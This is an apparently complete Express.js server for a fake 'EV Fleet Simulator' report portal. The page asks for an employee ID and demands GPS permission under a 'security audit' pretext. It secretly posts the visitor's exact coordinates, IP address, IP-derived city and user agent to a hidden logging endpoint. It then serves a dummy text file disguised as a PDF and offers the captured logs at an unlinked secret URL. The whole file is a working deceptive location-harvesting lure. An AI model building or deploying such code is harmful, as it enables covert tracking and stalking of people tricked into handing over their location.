const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = 4000;
const SECRET_PATH = "/sssss"; // 🔐 Secret path to view captured GPS logs
const LOG_FILE = path.join(__dirname, "logs.json");

// Middleware
app.use(bodyParser.json());

// Ensure logs.json exists
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

// --- HELPER: SAVE DATA ---
function saveLog(entry) {
  try {
    const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
    logs.push(entry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
    console.log(`[LOG] New Entry: ${entry.employeeId} | ${entry.gps_live.city_selection}`);
  } catch (err) {
    console.error("Error saving log:", err);
  }
}

// --- ROUTE 1: THE SIMULATOR UI (GET /) ---
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EV Fleet Simulator | Report Download</title>
    <style>
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; color: #333; }
        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 100%; max-width: 500px; text-align: center; }
        h1 { color: #1e3c72; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; line-height: 1.5; }
        
        .form-group { text-align: left; margin-bottom: 20px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; color: #444; font-size: 14px; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        
        button { width: 100%; padding: 15px; background-color: #27ae60; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
        button:hover { background-color: #219150; }
        button:disabled { background-color: #bdc3c7; cursor: not-allowed; }

        .spinner { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid white; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #statusMsg { margin-top: 15px; font-size: 14px; font-weight: bold; }
        .error { color: #e74c3c; }
        .success { color: #27ae60; }
        .note { font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>

<div class="card">
    <h1>🚛 EV Fleet Simulator</h1>
    <p>Secure download portal for Commercial Light Weight Truck analytics. Please authenticate to download the PDF report.</p>

    <div class="form-group">
        <label>Employee ID</label>
        <input type="text" id="empId" placeholder="Ex: EMP-8821">
    </div>

    <div class="form-group">
        <label>Select Region</label>
        <select id="citySelect">
            <option value="" disabled selected>Select City</option>
            <option value="Delhi">Delhi</option>
            <option value="Gurugram">Gurugram</option>
            <option value="Noida">Noida</option>
            <option value="Faridabad">Faridabad</option>
        </select>
    </div>

    <button id="downloadBtn" onclick="initiateDownload()">
        <div class="spinner" id="loadingSpinner"></div>
        <span id="btnText">Generate & Download PDF</span>
    </button>

    <div id="statusMsg"></div>
    <div class="note">⚠️ GPS Location required for security audit.</div>
</div>

<script>
    function initiateDownload() {
        const empId = document.getElementById('empId').value;
        const city = document.getElementById('citySelect').value;
        const msg = document.getElementById('statusMsg');
        const btn = document.getElementById('downloadBtn');
        const spinner = document.getElementById('loadingSpinner');
        const btnText = document.getElementById('btnText');

        // Validation
        if (!empId || !city) {
            msg.className = 'error';
            msg.innerText = "Please enter Employee ID and select a City.";
            return;
        }

        // UI Loading State
        msg.innerText = "Requesting GPS Access...";
        msg.className = '';
        btn.disabled = true;
        spinner.style.display = "block";
        btnText.innerText = "Verifying Location...";

        // Geolocation Logic
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                // Success
                async (position) => {
                    msg.className = 'success';
                    msg.innerText = "Location Verified. Downloading...";

                    // 1. Send Data to Server
                    try {
                        await fetch('/api/capture-log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                employeeId: empId,
                                city: city,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            })
                        });

                        // 2. Trigger Dummy File Download
                        window.location.href = "/download-dummy-pdf";
                        
                        // Reset UI
                        setTimeout(() => {
                            btn.disabled = false;
                            spinner.style.display = "none";
                            btnText.innerText = "Download Again";
                            msg.innerText = "Download Started.";
                        }, 2000);

                    } catch (e) {
                        msg.className = 'error';
                        msg.innerText = "Server Error. Try again.";
                        btn.disabled = false;
                    }
                },
                // Error (GPS Denied/Failed)
                (error) => {
                    console.error(error);
                    msg.className = 'error';
                    msg.innerText = "❌ Error: You must ALLOW GPS to download this report.";
                    btn.disabled = false;
                    spinner.style.display = "none";
                    btnText.innerText = "Generate & Download PDF";
                }
            );
        } else {
            msg.innerText = "Geolocation is not supported by this browser.";
        }
    }
</script>

</body>
</html>
  `);
});

// --- ROUTE 2: API TO SAVE GPS LOGS (Hidden Action) ---
app.post("/api/capture-log", async (req, res) => {
  const { employeeId, city, latitude, longitude } = req.body;
  
  // Try to get IP info
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  let regionInfo = "Unknown";
  try {
     const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
     const ipData = await ipRes.json();
     regionInfo = ipData.city || "Unknown";
  } catch(e) {}

  const logEntry = {
    timestamp: new Date().toISOString(),
    employeeId: employeeId,
    gps_live: {
      lat: latitude,
      lon: longitude,
      city_selection: city
    },
    network: {
      ip: ip,
      ip_region: regionInfo,
      userAgent: req.headers["user-agent"]
    }
  };

  saveLog(logEntry);
  res.json({ success: true });
});

// --- ROUTE 3: DUMMY PDF DOWNLOAD ---
// This serves a text file named .pdf to satisfy the "Simulated PDF" requirement
app.get("/download-dummy-pdf", (req, res) => {
  const dummyContent = `
==================================================
   EV COMMERCIAL FLEET SIMULATION REPORT - 2024
==================================================

Confidential Report
Generated by: Simulator System
Status: APPROVED

FLEET SUMMARY:
--------------------------------------------------
Region: India (North)
Vehicle Type: Light Weight Commercial (LCV)
Total Units: 45
Active Units: 32
Charging: 13
CO2 Saved: 1,240 kg

PERFORMANCE METRICS:
- Tata Ace EV: 98% Efficiency
- Mahindra Zor Grand: 95% Efficiency
- Euler HiLoad: 92% Efficiency

[END OF DUMMY DATA FILE]
  `;

  res.setHeader("Content-Type", "application/pdf"); // Browser thinks it's a PDF
  res.setHeader("Content-Disposition", "attachment; filename=EV_Fleet_Report.pdf");
  res.send(dummyContent);
});

// --- ROUTE 4: SECRET LOG VIEWER (GET /sssss) ---
app.get(SECRET_PATH, (req, res) => {
  const logs = fs.readFileSync(LOG_FILE, "utf8");
  res.setHeader("Content-Type", "application/json");
  res.setHeader("Content-Disposition", "attachment; filename=captured_gps_logs.json");
  res.send(logs);
});

app.listen(PORT, () => {
  console.log(`Simulator running on http://localhost:${PORT}`);
});
